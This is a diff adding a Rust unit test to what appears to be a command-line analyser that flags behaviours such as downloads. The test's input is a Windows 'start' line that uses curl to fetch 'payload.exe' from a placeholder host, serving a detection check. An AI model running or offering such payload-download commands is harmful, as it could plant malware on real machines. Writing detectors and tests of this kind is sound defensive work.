@@ -5422,6 +5422,7 @@ mod case_insensitive_keywords_tests {
 mod start_tests {
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
+    use crate::traits::Trait;
 
     #[test]
     fn start_strips_flags_and_runs_inner() {
@@ -5433,6 +5434,30 @@ mod start_tests {
             env.exec_cmd.is_empty(),
             "start should not enqueue: {:?}",
             env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn start_with_directory_option_recurses_into_inner_command() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"start /D C:\Temp curl -o out.exe http://x.example/payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download {
+                    src,
+                    dst: Some(dst),
+                    ..
+                } if src == "http://x.example/payload.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "start /D child command not interpreted: {:?}",
+            env.traits
         );
     }
 
